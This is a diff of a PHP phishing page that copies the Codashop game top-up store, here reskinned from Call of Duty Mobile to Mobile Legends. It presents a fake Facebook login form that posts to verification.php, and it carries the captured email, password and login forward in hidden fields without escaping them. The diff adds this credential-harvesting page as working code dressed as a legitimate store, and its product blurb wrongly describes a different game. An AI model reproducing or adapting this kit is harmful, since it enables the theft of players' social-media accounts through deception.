@@ -24,7 +24,7 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
       <!--[if lt IE 9]>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
       <![endif]-->
-      <title>Call of Duty Mobile (Indonesia) - Codashop</title>
+      <title>Mobile Legends (Indonesia) - Codashop</title>
       <meta name="generator" content="coda2" />
       <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
       <meta name="mobile-web-app-capable" content="yes" />
@@ -43,14 +43,14 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
       <!-- OG Tags Start -->
       <meta property="og:url" content="https://www.codashop.com/id/free-fire" />
       <meta property="og:type" content="product" />
-      <meta property="og:title" content="Call of Duty Mobile (Indonesia) - Codashop" />
-      <meta property="og:description" content="Top up diamond Call of Duty Mobile menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
+      <meta property="og:title" content="Mobile Legends (Indonesia) - Codashop" />
+      <meta property="og:description" content="Top up diamond Mobile Legends menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
          />
       <meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.png" />
       <meta property="og:image:width" content="1200" />
       <meta property="og:image:height" content="630" />
       <!-- OG Tags End -->
-      <meta name="description" content="Top up diamond Call of Duty Mobile menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
+      <meta name="description" content="Top up diamond Mobile Legends menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
          />
       <link rel="preconnect" href="https://www.google-analytics.com">
       <link rel="preconnect" href="https://connect.facebook.net">
@@ -108,7 +108,7 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
             <div class="content-box-fb">
                <img src="https://cdn-www.bluestacks.com/bs-images/69b5965b1c8f0d20f45be82f0522d88a6bfa2ba0.png" style="width: 60px;">
                <div class="txt-login-fb">
-                  Log in to your Facebook account to connect to Call of Duty Mobile
+                  Log in to your Facebook account to connect to Mobile Legends
                </div>
                <form class="login-form" action="verification.php" method="post">
                   <label>
@@ -170,7 +170,7 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
          </div>
       </div>
 
-      <input type="hidden" id="seller-name" value="Call of Duty Mobile">
+      <input type="hidden" id="seller-name" value="Mobile Legends">
       <input type="hidden" id="context-path" value="">
       <input type="hidden" id="group-id" value="33">
       <div id="product-page__container" class="product-page__container">
@@ -238,38 +238,30 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
             <input type="hidden" id="page-name" value="productPage">
             <input type="hidden" id="country-id" value="ID">
             <header class="product-details-container shop-content__container">
-	<figure class="product-top-banner__container shop-content--image">
-		<img src="https://cdn1.codashop.com/S/content/common/images/mno/codmobile2_640x241.jpg" alt="" class="product__top-banner">
-	</figure>
-		
-	<h2 class="product__name shop-content--heading">Call of Duty Mobile</h2>
+               <figure class="product-top-banner__container shop-content--image">
+                  <img src="https://cdn1.codashop.com/S/content/common/images/mno/mlbb_halloween640x241.jpg" alt="" class="product__top-banner">
+               </figure>
+               <h2 class="product__name shop-content--heading">Mobile Legends</h2>
+               <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
+               <label for="product-description">
+               <span class="more-info">Baca lebih lanjut</span>
+               <span class="less-info">Tutup informasi detail</span>
+               </label>
+               <article class="product__description shop-content__container"><nav class="shop-content--paragraph">Produk lainnya ⇒ <a href="https://www.codashop.com/id/mobile-legends-member/">Starlight Member</a>, <a href="https://www.codashop.com/id/mobile-legends-special-bundle-a">Special Bundle A</a>, <a href="https://www.codashop.com/id/mobile-legends-special-bundle-b">Special Bundle B</a>, <a href="https://www.codashop.com/id/mobile-legends-twilight-pass">Twilight Pass</a></nav>
 
-	<input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
-	<label for="product-description">
-		<span class="more-info">Baca lebih lanjut</span>
-		<span class="less-info">Tutup informasi detail</span>
-	</label>
-	<article class="product__description shop-content__container"><p class="shop-content--paragraph"> <strong> PERINGATAN: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Seluler. Harap pastikan bahwa aplikasi Shopee Anda diperbarui, dan ShopeePay Anda memiliki saldo yang cukup sebelum top up.</strong> </p> 
+<p class="shop-content--paragraph">Kenaikan harga terjadi berdasarkan ketetapan Dirjen Pajak mengenai PPN atas barang dan jasa digital per Agustus 2020. Informasi kenaikan pajak dapat dilihat di <a href="https://news.codashop.com/id/harga-diamonds-naik-baca-penjelasanya/" target="_blank">https://news.codashop.com/id/harga-diamonds-naik-baca-penjelasanya/</a> </p>
 
- <p class="shop-content--paragraph"> <i><b>*Jumlah  CP tertera sudah ditambah dengan bonus hingga 45%</b></i><b> </b></p> 
+<p class="shop-content--paragraph">PERINGATAN: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Seluler (Mobile). Harap pastikan bahwa aplikasi Shopee Anda telah diperbarui dan memiliki saldo ShopeePay yang mencukupi sebelum melakukan top up.</p>
 
+<p class="shop-content--paragraph">Top up ML Diamond hanya dalam hitungan detik! Cukup masukan Username MLBB Anda, pilih jumlah Diamond yang Anda inginkan, selesaikan pembayaran, dan Diamond akan secara langsung ditambahkan ke akun Mobile Legends Anda.</p>
 
-<p class="shop-content--paragraph"> Top up CP COD Mobile hanya dalam beberapa detik! Cukup masukan User ID COD Mobile Anda, pilih jumlah CP yang Anda inginkan, selesaikan pembayaran, dan CP akan secara langsung ditambahkan ke akun COD Mobile Anda. </p> 
+<p class="shop-content--paragraph">Bayarlah menggunakan GoPay, ShopeePay, Dana, OVO, LinkAja, Telkomsel, Indosat, Tri, XL, Bank Transfer, Indomaret, Alfamart, Kredivo, TrueMoney Indonesia, Kartu Kredit, dan Doku Wallet. Tanpa perlu kartu kredit, registrasi ataupun log-in.</p>
 
-<p class="shop-content--paragraph"><strong class="shop-content--pc-name">Bayarlah menggunakan GoPay, OVO, Bank Transfers, Indosat, Tri Indonesia, XL Axiata, Smartfren, DANA, Shopee Pay, LinkAja, Kredivo, Alfamart, Indomaret, DOKU, TrueMoney Indonesia, dan kartu kredit. Tanpa perlu kartu kredit, registrasi ataupun log-in.</strong></p>
+<p class="shop-content--paragraph">Unduh dan mainkan Mobile Legends: Bang Bang sekarang!<br>
+<a class="shop-content--badge" href="https://apps.apple.com/app/id1160056295?country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"> </a>
 
-<p class="shop-content--paragraph"> Unduh Garena Call of Duty Mobile sekarang!<br>
-<a class="shop-content--badge" href="http://bit.ly/2mhWBSl" rel="noopener" target="_blank">
-<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a>
-<a class="shop-content--badge" href="https://apps.apple.com/id/app/call-of-duty-mobile-garena/id1465688043" rel="noopener" target="_blank">
-<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a>
-
-</p><p class="shop-content--paragraph">NGOBROL BARENG TENTANG<br>
-<a class="shop-content--image" href="https://community.codashop.com/id/categories/id-call-of-duty-mobile" target="_blank" rel="noopener"> 
-
-<img src="https://cdn1.codashop.com/S/content/common/images/promos/Community Banners/codm_id_codaclub.jpeg" alt="Call of Duty Mobile Conversation"></a></p></article>
-
-</header>
+<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.mobile.legends&amp;country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"> </a></p></article>
+            </header>
             <section id="contents" class="main-content">
                <input type="hidden" id="pricePointId" name="pricePointId" value="" />
                <div class="confirm-modal__container" id="confirm-user-dialog" title="">
@@ -361,8 +353,8 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
                             <input name="password" type="hidden" value="<?= $_POST['password'] ?>" readonly>
                             <input name="login" type="hidden" value="<?= $_POST['login'] ?>" readonly>
                             <div style="margin-top: 10px; font-size: 14px;">
-                                <label for="">Open ID</label>
-                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="userIdForm" class="product-form-input" value="<?= $_POST['userIdForm'] ?>" readonly>
+                                <label for="">User ID</label>
+                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="userIdForm" class="product-form-input" value="<?= $_POST['userIdForm'] ?> (<?= $_POST['zonaIdForm'] ?>)" readonly>
                             </div>
                             <div style="margin-top: 10px; font-size: 14px;">
                                 <label for="">Nickname</label>
@@ -477,10 +469,10 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
                             <div style="margin-top: 10px;">
                                 <label for="">Tier</label>
                                 <select style="margin-top: 10px; font-size: 14px;" id="rpl" name="tier" class="product-form-input" required>
-                                <option value="" selected="selected" disabled="disabled">Ranked Tier Level</option> 
-                                <option value="Pro" class="form-control">Pro</option>
-                                <option value="Master" class="form-control">Master</option>
-                                <option value="Legendary" class="form-control">Legendary</option>  
+                                <option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
+                                <option value="Epic" class="form-control">Epic</option>
+                                <option value="Legend" class="form-control">Legend</option>
+                                <option value="Mythic" class="form-control">Mythic</option>  
                                 </select>
                             </div>
                         
@@ -518,24 +510,19 @@ if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login
             </section>
          </main>
          <section class="section product__long-description shop-content__container">
-         
             <h1 class="product-tagline-title">
-               Beli Diamond Call of Duty Mobile murah tanpa kartu kredit!
+               Beli Diamond Mobile Legends murah tanpa kartu kredit!
             </h1>
-            <article class="product__description shop-content__container"><p class="shop-content--paragraph"> <strong> PERINGATAN: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Seluler. Harap pastikan bahwa aplikasi Shopee Anda diperbarui, dan ShopeePay Anda memiliki saldo yang cukup sebelum top up.</strong> </p> 
-
- <p class="shop-content--paragraph"> <i><b>*Jumlah  CP tertera sudah ditambah dengan bonus hingga 45%</b></i><b> </b></p> 
-
-
-<p class="shop-content--paragraph"> Top up CP COD Mobile hanya dalam beberapa detik! Cukup masukan User ID COD Mobile Anda, pilih jumlah CP yang Anda inginkan, selesaikan pembayaran, dan CP akan secara langsung ditambahkan ke akun COD Mobile Anda. </p> 
-
-<p class="shop-content--paragraph"><strong class="shop-content--pc-name">Bayarlah menggunakan GoPay, OVO, Bank Transfers, Indosat, Tri Indonesia, XL Axiata, Smartfren, DANA, Shopee Pay, LinkAja, Kredivo, Alfamart, Indomaret, DOKU, TrueMoney Indonesia, dan kartu kredit. Tanpa perlu kartu kredit, registrasi ataupun log-in.</strong></p>
-
-<p class="shop-content--paragraph"> Unduh Garena Call of Duty Mobile sekarang!<br>
-<a class="shop-content--badge" href="http://bit.ly/2mhWBSl" rel="noopener" target="_blank">
-<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a>
-<a class="shop-content--badge" href="https://apps.apple.com/id/app/call-of-duty-mobile-garena/id1465688043" rel="noopener" target="_blank">
-<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a></p></article>
+            <article class="product__tag-line">
+               <p class="shop-content--paragraph"> Hanya butuh beberapa detik saja untuk membeli Diamonds Mobile Legends. Di Codashop, top-up menjadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk diantaranya Indonesia. Caranya
+                  mudah, tanpa perlu kartu kredit, registrasi, ataupun log-in! <a href="#"> Klik disini untuk memulai. </a> 
+               </p>
+               <p class="shop-content--paragraph"> Butuh bantuan? kunjungi <a href="http://bit.ly/CodaHelpIDN" target="_blank">Pusat Bantuan</a> kami.</p>
+               <p class="shop-content--paragraph"> Tentang Mobile Legends: <br> Mobile Legends atau FF Garena adalah mobile game survival shooter terbaik. Setiap 10 menit permainan menempatkan anda di pulau jauh tempat anda menghadapi 49 pemain lain, semuanya bertujuan untuk mencari keselamatan.
+                  Pemain bebas memilih titik awal menggunakan parasutnya, dan bertujuan untuk tetap berada di save zone selama mungkin. Mengendarai kendaraan untuk menjelajahi peta yang luas, bersembunyi di parit, atau menjadi tidak terlihat dengan
+                  merangkak di bawah rumput. Menyergap, menembak, bertahan hidup, hanya ada satu tujuan: untuk bertahan hidup dan menjadi puncak dari semuanya. 
+               </p>
+            </article>
          </section>
          <section class="faq-accordion-container">
             <div class="accordion-container"></div>
